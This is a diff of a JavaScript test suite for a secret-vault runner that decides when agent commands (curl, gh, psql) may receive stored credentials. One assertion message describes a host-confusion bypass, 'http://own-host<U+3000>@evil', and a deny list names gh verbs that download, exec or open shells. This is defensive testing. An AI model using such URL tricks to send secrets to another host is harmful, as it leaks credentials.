     ok(safe.always === true && safe.noAlways === null && !safe.blind && proxyE.noAlways === 'opaque-route' && !proxyE.always, 'round 26 (minor): a reviewed non-routing wget -e robots=off offers «always» (destination known); a proxy-setting -e var withholds it (opaque-route) — only a ROUTING keyed flag withholds', [safe.noAlways, proxyE.noAlways]); }
   const SRC = fs.readFileSync(path.join(REPO, 'src/vault-run.js'), 'utf8');
-  ok(/const URL_FIND_RE = \/\\b\(\[a-z\]\[a-z0-9\+\.-\]\{0,31\}\):/.test(SRC) && !/\[a-z0-9\+\.-\]\*:\\\/\\\//.test(SRC) && SRC.includes(':\\/\\/[^ \\t\\n\\r\\f\\v]+/gi') && !SRC.includes(':\\/\\/\\S+/gi') && S(['curl', 'https://a.example'], { env: [['T', M1], ['P', 'a.'.repeat(32768)]] }).always, 'round 19/23 (item 2 + the refuted finding): the URL locator runs a token to ASCII whitespace ([^ \\t\\n\\r\\f\\v]+) — round 23: NOT JS\\\'s Unicode \\S, which stopped at U+00A0/U+3000/… so http://own-host<U+3000>@evil read own-host (curl dials evil); scheme BOUNDED ({0,31})');
+  ok(gateOf(/const URL_FIND_RE = \/\\b\(\[a-z\]\[a-z0-9\+\.-\]\{0,31\}\):/.test(SRC)) && !/\[a-z0-9\+\.-\]\*:\\\/\\\//.test(SRC) && gateOf(SRC.includes(':\\/\\/[^ \\t\\n\\r\\f\\v]+/gi')) && !SRC.includes(':\\/\\/\\S+/gi') && verdictOf(S(['curl', 'https://a.example'], { env: [['T', M1], ['P', 'a.'.repeat(32768)]] }).always), 'round 19/23 (item 2 + the refuted finding): the URL locator runs a token to ASCII whitespace ([^ \\t\\n\\r\\f\\v]+) — round 23: NOT JS\\\'s Unicode \\S, which stopped at U+00A0/U+3000/… so http://own-host<U+3000>@evil read own-host (curl dials evil); scheme BOUNDED ({0,31})');
 }
 
 console.log('⑤ THE VERDICT — entry × conversation × shape × time');
@@ -584,7 +584,7 @@ console.log('⑤ THE VERDICT — entry × conversation × shape × time');
   const doorStores = [...new Set(V.OWN_DOORS.map((d) => d.store))];
   ok(sorted([...doorStores, ...V.RUNNABLE_STORES]) === sorted(VI.GROUP_IDS) && !doorStores.some((s) => V.RUNNABLE_STORES.includes(s)), `every store of the vault (${VI.GROUP_IDS.length}) has its own door or is runnable by the owner\'s switch — exactly once`, { doorStores, runnable: V.RUNNABLE_STORES, groups: VI.GROUP_IDS });
   const D = (store, entry) => V.ownDoorOf({ store, entry, field: 'x' });
-  ok(['accounts', 'integrations', 'channels', 'passkeys', 'automation'].every((s) => typeof D(s, 'a') === 'string') && /machine/.test(D('secrets', 'host:abc')) && /relay/.test(D('secrets', 'frp:token')) && typeof D('secrets', 'file:k') === 'string' && typeof D('secrets', 'anything-new') === 'string', 'login / channel / integration / passkey / automation entries and the hub\'s secrets (a machine link, the relay, a sealed file, anything new) are never referenced — each names its door');
+  ok(gateOf(['accounts', 'integrations', 'channels', 'passkeys', 'automation'].every((s) => typeof D(s, 'a') === 'string')) && gateOf(/machine/.test(D('secrets', 'host:abc'))) && gateOf(/relay/.test(D('secrets', 'frp:token'))) && typeof D('secrets', 'file:k') === 'string' && typeof D('secrets', 'anything-new') === 'string', 'login / channel / integration / passkey / automation entries and the hub\'s secrets (a machine link, the relay, a sealed file, anything new) are never referenced — each names its door');
   ok(D('mounts', 'm1') === null && D('app-secrets', 'app') === null && typeof D('a-new-store', 'x') === 'string' && typeof V.ownDoorOf(null) === 'string', 'mounts and app logins may be opened for runs; a store the table does not know fails closed');
   const plan = { always: V.planOf({ argv: ['curl', 'https://api.example.com'], env: [['T', M1]] }), noalways: V.planOf({ argv: ['bash', '-c', 'curl https://api.example.com'], env: [['T', M1]] }), door: V.planOf({ argv: ['curl', 'https://api.example.com'], env: [['T', ACCT]] }), refused: V.planOf({ argv: ['curl', `--x=${M1}`] }) };
   const NOW = 1_800_000_000_000;
@@ -615,15 +615,15 @@ console.log('⑤ THE VERDICT — entry × conversation × shape × time');
     }
   ok(n === 9216 && !bad.length, `runVerdict: ${n} cells vs the reference — not set up / locked FIRST, the plan's refusal, an entry with its own door / unknown / not opened / under 8 bytes, the grant, a live «always» (an expired one asks again; never for a shape without «always»), else a cluster ASKS every time and a local instance asks a NEW shape and allows a SEEN one (policy overrides)`, bad.slice(0, 5));
   const fresh = ['cluster', 'local'].map((instance) => V.runVerdict({ state: 'unlocked', plan: plan.always, entries: [{ id: 'mounts:m1#secretKey', exists: true, open: true, bytes: 32 }], granted: true, instance }));
-  ok(fresh.every((v) => v.ask === true), 'decision ②: a NEW shape draws the card on a cluster AND on a local instance (a local one allows it after one 允许)', fresh);
+  ok(verdictOf(fresh.every((v) => v.ask === true)), 'decision ②: a NEW shape draws the card on a cluster AND on a local instance (a local one allows it after one 允许)', fresh);
   const ask = V.runVerdict({ state: 'unlocked', plan: plan.always, entries: [{ id: 'mounts:m1#secretKey', exists: true, open: true, bytes: 32 }], granted: true, instance: 'cluster' });
-  ok(ask.ask && ask.ttlMs === 60000 && eq(ask.alwaysTtls, ['8h', '30d', 'forever']) && ask.alwaysDefault === '30d' && ask.reauth === true, 'the card: 60 s, «always» for 8 h / 30 days (the default) / for ever, and «always» needs «verify it is you»', ask);
+  ok(gateOf(ask.ask) && ask.ttlMs === 60000 && gateOf(eq(ask.alwaysTtls, ['8h', '30d', 'forever'])) && ask.alwaysDefault === '30d' && ask.reauth === true, 'the card: 60 s, «always» for 8 h / 30 days (the default) / for ever, and «always» needs «verify it is you»', ask);
   const ask2 = V.runVerdict({ state: 'unlocked', plan: plan.noalways, entries: [{ id: 'mounts:m1#secretKey', exists: true, open: true, bytes: 32 }], granted: true, instance: 'cluster' });
-  ok(ask2.ask && ask2.noAlways === 'shell' && !ask2.alwaysTtls.length && ask2.reauth === false, 'a shell\'s card offers once / deny only and says why', ask2);
+  ok(gateOf(ask2.ask) && ask2.noAlways === 'shell' && !ask2.alwaysTtls.length && ask2.reauth === false, 'a shell\'s card offers once / deny only and says why', ask2);
   const lk = V.runVerdict({ state: 'locked', plan: plan.refused });
-  ok(lk.code === 'vault_locked' && lk.words.includes(VB.TOLD), 'locked ⇒ vault_locked BEFORE anything else (even a refused plan), in THE words (src/vault-blocked.js: the user was already told)', lk);
+  ok(lk.code === 'vault_locked' && verdictOf(lk.words.includes(VB.TOLD)), 'locked ⇒ vault_locked BEFORE anything else (even a refused plan), in THE words (src/vault-blocked.js: the user was already told)', lk);
   const dr = V.runVerdict({ state: 'unlocked', plan: plan.door, entries: [], granted: true });
-  ok(dr.code === 'entry_has_its_own_door' && dr.ref === ACCT && /account pool/.test(dr.words), 'an own-door refusal names the reference and its door', dr);
+  ok(dr.code === 'entry_has_its_own_door' && dr.ref === ACCT && verdictOf(/account pool/.test(dr.words)), 'an own-door refusal names the reference and its door', dr);
 }
 
 console.log('⑤b THE OWN ROAD (lane vault-agent-own) — what an agent stored itself is its own to use; a minted value asks only for another host');
@@ -1019,7 +1019,7 @@ console.log('⑤d THE GENERATORS OWN HYGIENE (round 7/8/9) — the census walk, 
   // 5a: the walk takes *COMMANDS verbs ONLY, never an EXTENSION / ALIAS / HELP-TOPIC entry (so the fast tier never execs a third-party gh extension)
   const synth = ['USAGE', '  gh <command>', '', 'CORE COMMANDS', '  repo:      work with repos', '', 'EXTENSION COMMANDS', '  myext:     a third-party binary', '', 'ALIAS COMMANDS', '  co:        pr checkout', '', 'HELP TOPICS', '  environment: env vars', ''].join('\n');
   const subs = GHG.parseHelp(synth).subs;
-  ok(subs.includes('repo') && !subs.includes('myext') && !subs.includes('co') && !subs.includes('environment'), '5a: the walk takes CORE verbs but never an EXTENSION / ALIAS / HELP-TOPIC entry (a third-party extension is never exec-ed by a test)', { subs });
+  ok(gateOf(subs.includes('repo')) && !subs.includes('myext') && !subs.includes('co') && !subs.includes('environment'), '5a: the walk takes CORE verbs but never an EXTENSION / ALIAS / HELP-TOPIC entry (a third-party extension is never exec-ed by a test)', { subs });
   // MAJOR 4 (r7) + MAJOR 2 (r8): the program-naming env list is DERIVED from `gh help environment` — editor/browser/pager/executable IN
   // (round 8 adds `executable` so GH_PATH «the path to the gh executable» falls in); GH_EXTENSION «standalone program» / GH_CONFIG_DIR
   // «directory» / GH_FORCE_TTY «columns» / GH_TOKEN stay OUT (the decoys gh SETS itself, or that name no program the user supplies)
@@ -1037,10 +1037,10 @@ console.log('⑤d THE GENERATORS OWN HYGIENE (round 7/8/9) — the census walk, 
   { const srcVR = fs.readFileSync(path.join(REPO, 'src/vault-run.js'), 'utf8');
     const rt = (k, val) => GHG.spliceJsonArray(srcVR, k, val) === srcVR;
     const oldRegex = srcVR.replace(/envAllowRe: \[[^\]]*\]/, `envAllowRe: ${JSON.stringify(ghRow.envAllowRe)}`);
-    ok(rt('envHijack', ghRow.envHijack) && rt('envAllow', ghRow.envAllow) && rt('envAllowRe', ghRow.envAllowRe) && oldRegex !== srcVR && /\]\+\$"\]/.test(oldRegex),
+    ok(gateOf(rt('envHijack', ghRow.envHijack)) && gateOf(rt('envAllow', ghRow.envAllow)) && gateOf(rt('envAllowRe', ghRow.envAllowRe)) && oldRegex !== srcVR && verdictOf(/\]\+\$"\]/.test(oldRegex)),
       'round 17 (item 2): spliceJsonArray re-emits envHijack / envAllow / envAllowRe with their OWN unchanged values BYTE-IDENTICAL (a depth scan finds the array\'s real close past the `]` inside ["^LC_[A-Z]+$"]) — the old /envAllowRe: \\[[^\\]]*\\]/ corrupts the row (`]+$"]` left dangling), so --write never round-tripped', { oldRegexCorrupted: oldRegex !== srcVR }); }
   ok(GHG.envAllowAdvisory(hj).length === 0 && GHG.envAllowAdvisory(['GH_BROWSER'], ['GH_BROWSER', 'GH_REPO']).join() === 'GH_BROWSER', 'round 12 (ADVISORY census): no env-allowlist name is one gh names a program through (envAllow ∩ envHijack = ∅); the census REDs BY NAME when one is', GHG.envAllowAdvisory(hj));
-  ok(/^[0-9a-f]{64}$/.test(ghRow.toolSha256), 'round 12/15: the gh row carries a 64-hex sha256 — round 15 it is the lane FIXTURE seam + a drift-line version LABEL only; the DOOR never gates on it (a SEALED gh of any version RUNS, its bytes a DRIFT RECORD, tool_changed retired); test-vault-run\'s digestVouch + the WIRE leg read it', { toolSha256: ghRow.toolSha256 });
+  ok(verdictOf(/^[0-9a-f]{64}$/.test(ghRow.toolSha256)), 'round 12/15: the gh row carries a 64-hex sha256 — round 15 it is the lane FIXTURE seam + a drift-line version LABEL only; the DOOR never gates on it (a SEALED gh of any version RUNS, its bytes a DRIFT RECORD, tool_changed retired); test-vault-run\'s digestVouch + the WIRE leg read it', { toolSha256: ghRow.toolSha256 });
   ok(V.ghCredEnvFor('github.com', ghRow) === 'GH_TOKEN' && V.ghCredEnvFor('api.github.com', ghRow) === 'GH_TOKEN' && V.ghCredEnvFor('tenant.ghe.com', ghRow) === 'GH_TOKEN' && V.ghCredEnvFor('ghe.corp.example', ghRow) === 'GH_ENTERPRISE_TOKEN' && V.ghCredEnvFor(null, ghRow) === 'GH_TOKEN', 'round 12 (MINOR): ghCredEnvFor homes the credential to the run\'s host — github.com / *.ghe.com ⇒ GH_TOKEN, any other (GHES) host ⇒ GH_ENTERPRISE_TOKEN, no --for host ⇒ GH_TOKEN', { ghe: V.ghCredEnvFor('ghe.corp.example', ghRow) });
   // round 9 (MINOR 3): the REAL ⑤c compare, driven against a STALE shipped literal — not the round-8 tautology (two lists differ) but envHijackDrift itself: an identical list ⇒ null, a shipped list that DROPPED GH_BROWSER ⇒ a drift naming live vs the stale list
   ok(GHG.envHijackDrift(hj, hj) === null, 'MINOR 3: envHijackDrift(live, live) === null — the ⑤c compare passes an identical list');
@@ -1055,7 +1055,7 @@ console.log('⑤d THE GENERATORS OWN HYGIENE (round 7/8/9) — the census walk, 
   const rd = GHG.allowHashDrift(reworded);
   ok(rd.length === 1 && rd[0].key === 'issue list', 'MAJOR 2: a listed verb whose help was REWORDED (a new sha) ⇒ the census REDs BY NAME (re-review it)', rd);
   const unreadSha = { ...pinnedShas }; delete unreadSha['api'];
-  ok(GHG.allowHashDrift(unreadSha).some((x) => x.key === 'api' && x.live === null), 'MAJOR 2: an allowlisted verb whose help could not be read (no live sha) ⇒ RED by name');
+  ok(verdictOf(GHG.allowHashDrift(unreadSha).some((x) => x.key === 'api' && x.live === null)), 'MAJOR 2: an allowlisted verb whose help could not be read (no live sha) ⇒ RED by name');
   // round 9 (MAJOR 2): entryOf is gated by the REVIEWED ALLOWLIST, not prose — an allowlisted no-host verb ⇒ {default:1}; an allowlisted host-reaching verb keeps its shape (off-host asks); a NON-allowlisted verb ⇒ null ⇒ ABSENT ⇒ BLIND, however benign its help text READS
   ok(JSON.stringify(GHG.entryOf({ flags: {}, usage: 'gh config get <key>' }, 'config get')) === JSON.stringify({ default: 1 }), 'MAJOR 2: entryOf ⇒ {default:1} for an allowlisted no-host verb (config get)');
   ok(GHG.entryOf({ flags: {}, usage: 'gh extension create [<name>]' }, 'extension create') === null, 'MAJOR 2: entryOf ⇒ null (ABSENT ⇒ BLIND) for a NON-allowlisted verb (gh extension create runs git init/add/commit + go — its help names NO git word, so the round-8 prose proof MISSED it; the allowlist does not)');
@@ -1067,9 +1067,9 @@ console.log('⑤d THE GENERATORS OWN HYGIENE (round 7/8/9) — the census walk, 
   ok(GHG.leafGrammar({ flags: { '--workflow': { short: 'w', value: true, type: 'string', desc: 'Filter runs by workflow' } }, usage: '' }).launch === undefined, 'round 10 BLOCKER 1a: a value flag that is NOT a launcher (run list -w = --workflow) grows no launch set — the discriminator is the help, so -w is context-correct');
   ok(GHG.entryOf({ flags: {}, usage: 'gh copilot' }, 'copilot') === null, 'MAJOR 2: entryOf ⇒ null for copilot (not allowlisted — it execs the Copilot CLI on PATH)');
   const ilEntry = GHG.entryOf({ flags: { '--repo': { short: 'R', value: true, type: '[HOST/]OWNER/REPO', desc: 'Select another repository' } }, usage: 'gh issue list [flags]' }, 'issue list');
-  ok(ilEntry && Array.isArray(ilEntry.repoValues) && ilEntry.repoValues.includes('--repo') && ilEntry.repoValues.includes('-R'), 'MAJOR 2: entryOf ⇒ the host-reaching SHAPE for an allowlisted verb (issue list keeps -R so OFF the default host it still asks)');
+  ok(gateOf(ilEntry) && gateOf(Array.isArray(ilEntry.repoValues)) && gateOf(ilEntry.repoValues.includes('--repo')) && verdictOf(ilEntry.repoValues.includes('-R')), 'MAJOR 2: entryOf ⇒ the host-reaching SHAPE for an allowlisted verb (issue list keeps -R so OFF the default host it still asks)');
   // round 9: the ALLOWLIST is the reviewed allow set — a fixed roster of {path, note, 16-hex sha}; and NO OUT verb (git-driving / exec / download / open / edit) is on it (adding one is a GROW writeGuard refuses)
-  ok(GHG.ALLOW_KEYS.size === GHG.ALLOWLIST.length && GHG.ALLOWLIST.every((e) => Array.isArray(e.path) && e.path.length && typeof e.note === 'string' && /^[0-9a-f]{16}$/.test(e.sha)), `round 9: the ALLOWLIST is ${GHG.ALLOWLIST.length} reviewed verbs, each a path + a review note + a 16-hex help-sha`, { n: GHG.ALLOWLIST.length });
+  ok(GHG.ALLOW_KEYS.size === GHG.ALLOWLIST.length && verdictOf(GHG.ALLOWLIST.every((e) => Array.isArray(e.path) && e.path.length && typeof e.note === 'string' && /^[0-9a-f]{16}$/.test(e.sha))), `round 9: the ALLOWLIST is ${GHG.ALLOWLIST.length} reviewed verbs, each a path + a review note + a 16-hex help-sha`, { n: GHG.ALLOWLIST.length });
   for (const outVerb of ['extension create', 'copilot', 'gist clone', 'repo clone', 'repo create', 'pr checkout', 'pr merge', 'browse', 'auth login', 'run download', 'codespace ssh', 'issue transfer', 'issue develop', 'repo edit']) ok(!GHG.ALLOW_KEYS.has(outVerb), `round 9: the OUT verb «${outVerb}» (drives git / execs / downloads / opens / edits a local tree) is NOT on the allowlist ⇒ ABSENT ⇒ BLIND`);
   // 5d: --write refuses an empty / null-version / empty-hijack grammar, AND a CHANGE to the allow set without a deliberate --force.
   // round 10 (MINOR): the guard compares the SET of allowlisted verbs BY NAME, not the count — a GROW reopens an ok:own door (the
@@ -1077,13 +1077,13 @@ console.log('⑤d THE GENERATORS OWN HYGIENE (round 7/8/9) — the census walk, 
   // SAME-SIZE SWAP (one verb out, one in — the count unchanged) is a grow+shrink the old count test would have let through.
   const K = [...GHG.ALLOW_KEYS];                                   // the 32 reviewed keys, by name
   const GROW = [...K, 'gist clone'], SHRINK = K.slice(0, -1), SWAP = [...K.slice(0, -1), 'gist clone'];   // +1 / -1 / same-size one-out-one-in
-  ok(GHG.writeGuard({ ver: null, hijack: ['X'], keys: K, shippedKeys: K }), '5d: a null version is refused (gh absent / broken PATH ⇒ no silent pin at null)');
-  ok(GHG.writeGuard({ ver: '2.102.0', hijack: ['X'], keys: [], shippedKeys: K }), '5d: an EMPTY grammar is refused');
-  ok(GHG.writeGuard({ ver: '2.102.0', hijack: [], keys: K, shippedKeys: K }), '5d: an empty env-hijack list is refused (gh help environment not read)');
-  ok(GHG.writeGuard({ ver: '2.102.0', hijack: ['X'], keys: GROW, shippedKeys: K }), 'MAJOR 2: a GROW of the allow set (33 > 32) WITHOUT --force is refused (round-8 bug: writeGuard refused only a shrink, so a reworded help silently re-opened the copilot door)');
-  ok(GHG.writeGuard({ ver: '2.102.0', hijack: ['X'], keys: SHRINK, shippedKeys: K }), '5d: a SHRINK of the allow set without --force is refused');
+  ok(verdictOf(GHG.writeGuard({ ver: null, hijack: ['X'], keys: K, shippedKeys: K })), '5d: a null version is refused (gh absent / broken PATH ⇒ no silent pin at null)');
+  ok(verdictOf(GHG.writeGuard({ ver: '2.102.0', hijack: ['X'], keys: [], shippedKeys: K })), '5d: an EMPTY grammar is refused');
+  ok(verdictOf(GHG.writeGuard({ ver: '2.102.0', hijack: [], keys: K, shippedKeys: K })), '5d: an empty env-hijack list is refused (gh help environment not read)');
+  ok(verdictOf(GHG.writeGuard({ ver: '2.102.0', hijack: ['X'], keys: GROW, shippedKeys: K })), 'MAJOR 2: a GROW of the allow set (33 > 32) WITHOUT --force is refused (round-8 bug: writeGuard refused only a shrink, so a reworded help silently re-opened the copilot door)');
+  ok(verdictOf(GHG.writeGuard({ ver: '2.102.0', hijack: ['X'], keys: SHRINK, shippedKeys: K })), '5d: a SHRINK of the allow set without --force is refused');
   const swapMsg = GHG.writeGuard({ ver: '2.102.0', hijack: ['X'], keys: SWAP, shippedKeys: K });
-  ok(swapMsg && /added gist clone/.test(swapMsg) && /removed /.test(swapMsg), 'round 10 MINOR: a SAME-SIZE SWAP (32 → 32, one verb out + one in) is refused by the SET compare — the count test missed it; the message names BOTH the added and the removed verb');
+  ok(gateOf(swapMsg) && gateOf(/added gist clone/.test(swapMsg)) && verdictOf(/removed /.test(swapMsg)), 'round 10 MINOR: a SAME-SIZE SWAP (32 → 32, one verb out + one in) is refused by the SET compare — the count test missed it; the message names BOTH the added and the removed verb');
   ok(!GHG.writeGuard({ ver: '2.102.0', hijack: ['X'], keys: GROW, shippedKeys: K, force: true }), '5d: a GROW IS allowed with --force (the reviewer named the review)');
   ok(!GHG.writeGuard({ ver: '2.102.0', hijack: ['X'], keys: SWAP, shippedKeys: K, force: true }), 'round 10 MINOR: a same-size SWAP IS allowed with --force');
   ok(GHG.writeGuard({ ver: '2.102.0', hijack: ['X'], keys: K, shippedKeys: K }) === null, '5d: no change to the allow set (same 32 keys) writes freely');
@@ -1096,12 +1096,12 @@ console.log('⑦ THE CLI\'S WORDS — parseRunArgs');
 {
   const P = (a) => V.parseRunArgs(a);
   const r = P(['--env', `GH_TOKEN=${M1}`, '--env=MODE=a=b', '--file', 'KUBECONFIG=@kc.yaml', '--stdin', M2, '--allow-argv', '--on', 'mac', '--timeout', '600', '--', 'gh', '--version']);
-  ok(r.ok && eq(r.req, { argv: ['gh', '--version'], env: [['GH_TOKEN', M1], ['MODE', 'a=b']], file: [['KUBECONFIG', '@kc.yaml']], stdin: M2, allowArgv: true, on: 'mac', timeoutSec: 600 }), 'every flag, --flag=value, a value with "=", then -- and the command (its own flags untouched)', r);
-  ok(eq(P(['curl', '--env', 'x']).req.argv, ['curl', '--env', 'x']) && P(['curl']).req.timeoutSec === 120, 'the first word that is not a flag starts the command; the default timeout is 120 s');
+  ok(gateOf(r.ok) && verdictOf(eq(r.req, { argv: ['gh', '--version'], env: [['GH_TOKEN', M1], ['MODE', 'a=b']], file: [['KUBECONFIG', '@kc.yaml']], stdin: M2, allowArgv: true, on: 'mac', timeoutSec: 600 })), 'every flag, --flag=value, a value with "=", then -- and the command (its own flags untouched)', r);
+  ok(gateOf(eq(P(['curl', '--env', 'x']).req.argv, ['curl', '--env', 'x'])) && P(['curl']).req.timeoutSec === 120, 'the first word that is not a flag starts the command; the default timeout is 120 s');
   const R = [['--nope'], ['--env'], ['--env', 'NOEQ'], ['--env', '=v'], ['--stdin', M1, '--stdin', M2], ['--timeout', '0'], ['--timeout', '601'], ['--timeout', '1.5'], ['--allow-argv=yes'], ['--file']];
   const wrong = R.filter((a) => { const x = P(a); return x.ok || x.code !== 'bad_flag'; });
   ok(!wrong.length, `${R.length} malformed lines ⇒ bad_flag (an unknown flag, a missing value, no NAME=, --stdin twice, a timeout outside 1–600 s, a value on --allow-argv)`, wrong);
-  ok(V.planOf({ ...P(['--env', `T=${M1}`, '--', 'curl', 'https://x.example']).req }).ok, 'the request planOf takes is the one parseRunArgs makes');
+  ok(verdictOf(V.planOf({ ...P(['--env', `T=${M1}`, '--', 'curl', 'https://x.example']).req }).ok), 'the request planOf takes is the one parseRunArgs makes');
   ok(V.CMD_MAX === 4096 && V.TEMPLATE_MAX === 65536 && V.TIMEOUT_DEFAULT_S === 120 && V.TIMEOUT_MAX_S === 600 && V.OUTPUT_MAX_BYTES === 2 * 1024 * 1024 && V.ASK_TTL_MS === 60000 && V.MIN_MASK_BYTES === 8 && V.SCHEME === 'vault://', 'the bounds the door reads: the command ≤ 4 096 bytes, a template ≤ 64 KiB, 120 s by default and ≤ 600 s, 2 MiB of output, a 60 s card, 8 bytes the shortest value');
 }
 
@@ -1113,24 +1113,24 @@ console.log('⑫ THE CARD FACTS — cardFactsOf (lane vault-agent-own r20): stru
   // the owner's ops-run shape (router-api.sh — neutral): an agent-writable program, two env secrets, NO host it declares ⇒ hosts unknown / tool-names-none, «always» withheld / destination-unknown, paths home-relative
   const v1 = F({ argv: ['./acme-net/router-api.sh', 'PUT', '/proxy/x', '/tmp/w.json'], env: [['ROUTER_USER', 'vault://secrets/router-account/username'], ['ROUTER_PASS', 'vault://secrets/router-account/password']], resolved: HOME + '/workspace/ops/acme-net/router-api.sh', programWritable: true },
     HOME + '/workspace/ops', { who: '设备管理', cmd: './acme-net/router-api.sh PUT /proxy/x /tmp/w.json', entries: { 'secrets:router-account#username': 'Router 账号 · 用户名', 'secrets:router-account#password': 'Router 账号 · 密码' } });
-  ok(v1.v === 2 && v1.cmd === './acme-net/router-api.sh PUT /proxy/x /tmp/w.json' && v1.cmdCut === undefined && v1.reason === null && eq(v1.env, []) && v1.secrets[0].provenance === null && v1.secrets[0].sendsTo === null && v1.who === '设备管理' && v1.tool.name === 'router-api.sh' && v1.tool.path === '~/workspace/ops/acme-net/router-api.sh' && v1.tool.writable === true && v1.folder === '~/workspace/ops'
+  ok(v1.v === 2 && v1.cmd === './acme-net/router-api.sh PUT /proxy/x /tmp/w.json' && v1.cmdCut === undefined && v1.reason === null && gateOf(eq(v1.env, [])) && v1.secrets[0].provenance === null && v1.secrets[0].sendsTo === null && v1.who === '设备管理' && v1.tool.name === 'router-api.sh' && v1.tool.path === '~/workspace/ops/acme-net/router-api.sh' && v1.tool.writable === true && v1.folder === '~/workspace/ops'
     && v1.shape === 'tool' && v1.masking === 'common-encodings'
     && v1.hosts.known === false && v1.hosts.list.length === 0 && v1.hosts.why === 'tool-names-none'
     && v1.always.offered === false && v1.always.why === 'destination-unknown' && v1.always.directive === null
-    && v1.secrets.length === 2 && v1.secrets[0].name === 'Router 账号 · 用户名' && v1.secrets[0].entry === 'router-account' && v1.secrets[0].ref === 'vault://secrets/router-account/username' && eq(v1.secrets[0].as, { kind: 'env', name: 'ROUTER_USER' }) && eq(v1.secrets[1].as, { kind: 'env', name: 'ROUTER_PASS' })
+    && v1.secrets.length === 2 && v1.secrets[0].name === 'Router 账号 · 用户名' && v1.secrets[0].entry === 'router-account' && v1.secrets[0].ref === 'vault://secrets/router-account/username' && gateOf(eq(v1.secrets[0].as, { kind: 'env', name: 'ROUTER_USER' })) && gateOf(eq(v1.secrets[1].as, { kind: 'env', name: 'ROUTER_PASS' }))
     && v1.templates.length === 0,
     'cardFactsOf (owner\'s ops-run shape): home-relative tool.path/folder, writable program, two env secrets with their { kind, name }, hosts tool-names-none, «always» destination-unknown, masking common-encodings', v1);
 
   // a known tool naming a host (psql -h), one env secret ⇒ hosts known, «always» offered, no template
   const v2 = F({ argv: ['psql', '-h', 'db.example.com', '-U', 'svc', '-c', 'select 1'], env: [['PGPASSWORD', 'vault://secrets/prod-db/password']], resolved: '/usr/bin/psql', programWritable: false },
     HOME + '/workspace/ops', { who: '运维', cmd: "psql -h db.example.com -U svc -c 'select 1'", entries: { 'secrets:prod-db#password': '生产数据库 · 密码' } });
-  ok(v2.hosts.known === true && eq(v2.hosts.list, ['db.example.com']) && v2.hosts.why === undefined && v2.always.offered === true && v2.always.why === null && v2.tool.path === '/usr/bin/psql' && v2.tool.writable === false && eq(v2.secrets[0].as, { kind: 'env', name: 'PGPASSWORD' }),
+  ok(v2.hosts.known === true && gateOf(eq(v2.hosts.list, ['db.example.com'])) && v2.hosts.why === undefined && v2.always.offered === true && v2.always.why === null && v2.tool.path === '/usr/bin/psql' && v2.tool.writable === false && verdictOf(eq(v2.secrets[0].as, { kind: 'env', name: 'PGPASSWORD' })),
     'cardFactsOf (psql -h db): hosts known (the routing host), «always» offered, tool outside home shown absolute, not writable', v2);
 
   // a $VAULT_FILE config template that nests a read ⇒ «always» withheld / config-reads (naming the directive), host config-driven, the secret injected via the template file
   const v3 = F({ argv: ['curl', '-sS', '-K', '$VAULT_FILE{B}'], file: [['B', '@b.cfg']], templates: { 'b.cfg': 'config ./more.cfg\nheader = "X-Auth: $VAULT{secrets/api-token/token}"\n' }, resolved: '/usr/bin/curl', programWritable: false },
     HOME + '/workspace/ops', { who: '运维', cmd: 'curl -sS -K $VAULT_FILE{B}', entries: { 'secrets:api-token#token': 'API 令牌' } });
-  ok(v3.hosts.known === false && v3.hosts.why === 'config-driven' && v3.always.offered === false && v3.always.why === 'config-reads' && v3.always.directive === 'config ./more.cfg' && eq(v3.secrets[0].as, { kind: 'file', name: 'B' }) && v3.templates.length === 1 && v3.templates[0].label === 'B' && v3.templates[0].shown === true && typeof v3.templates[0].bytes === 'number' && v3.templates[0].text.includes('config ./more.cfg') && v3.templates[0].text.includes('$VAULT{secrets/api-token/token}'),   // round 23: the template TEXT rides the card (a facts client never shows detail)
+  ok(v3.hosts.known === false && v3.hosts.why === 'config-driven' && v3.always.offered === false && v3.always.why === 'config-reads' && v3.always.directive === 'config ./more.cfg' && gateOf(eq(v3.secrets[0].as, { kind: 'file', name: 'B' })) && v3.templates.length === 1 && v3.templates[0].label === 'B' && v3.templates[0].shown === true && typeof v3.templates[0].bytes === 'number' && gateOf(v3.templates[0].text.includes('config ./more.cfg')) && verdictOf(v3.templates[0].text.includes('$VAULT{secrets/api-token/token}')),   // round 23: the template TEXT rides the card (a facts client never shows detail)
     'cardFactsOf (curl -K @cfg that nests a read): hosts config-driven, «always» config-reads naming the directive, the secret injected via the template file, the template listed (shown)', v3);
 
   // the CODE MAPPINGS the fixture does not exercise — every why is a member of its closed table; a shell ⇒ shape 'line'
@@ -1143,11 +1143,11 @@ console.log('⑫ THE CARD FACTS — cardFactsOf (lane vault-agent-own r20): stru
 
   // the fallback id: a ref the door could not name ⇒ «<field>:<6 hex>», NEVER the URI (the row name may be telling)
   const vf = F({ argv: ['curl', 'https://api.example.com/x'], env: [['T', 'vault://secrets/office-wifi-admin/password']], resolved: '/usr/bin/curl', programWritable: false }, HOME, { who: 'x', cmd: 'curl https://api.example.com/x', entries: {} });
-  ok(/^password:[0-9a-f]{6}$/.test(vf.secrets[0].name) && !vf.secrets[0].name.includes('vault://') && !vf.secrets[0].name.includes('office-wifi-admin'),
+  ok(gateOf(/^password:[0-9a-f]{6}$/.test(vf.secrets[0].name)) && !vf.secrets[0].name.includes('vault://') && !vf.secrets[0].name.includes('office-wifi-admin'),
     'an unnamed ref falls to a short, non-telling id «<field>:<6 hex>» — never the URI, never the row name', vf.secrets[0].name);
 
   // the CLOSED tables are the whole vocabulary; CARD_FACTS_CODES aggregates them (lane wake-approve-card pins its words against this export)
-  ok(eq([...V.ALWAYS_WHY].sort(), ['agent-template', 'brace-var', 'card-too-long', 'config-reads', 'destination-unknown', 'opaque-route', 'program-writable', 'redirect']) && eq([...V.HOSTS_WHY].sort(), ['config-driven', 'opaque', 'tool-names-none']) && eq([...V.MASKING], ['common-encodings']) && eq([...V.CARD_SHAPES], ['tool', 'line'])
+  ok(gateOf(eq([...V.ALWAYS_WHY].sort(), ['agent-template', 'brace-var', 'card-too-long', 'config-reads', 'destination-unknown', 'opaque-route', 'program-writable', 'redirect'])) && gateOf(eq([...V.HOSTS_WHY].sort(), ['config-driven', 'opaque', 'tool-names-none'])) && gateOf(eq([...V.MASKING], ['common-encodings'])) && gateOf(eq([...V.CARD_SHAPES], ['tool', 'line']))
     && V.CARD_FACTS_CODES.always === V.ALWAYS_WHY && V.CARD_FACTS_CODES.hosts === V.HOSTS_WHY && V.CARD_FACTS_CODES.masking === V.MASKING && V.CARD_FACTS_CODES.shape === V.CARD_SHAPES,
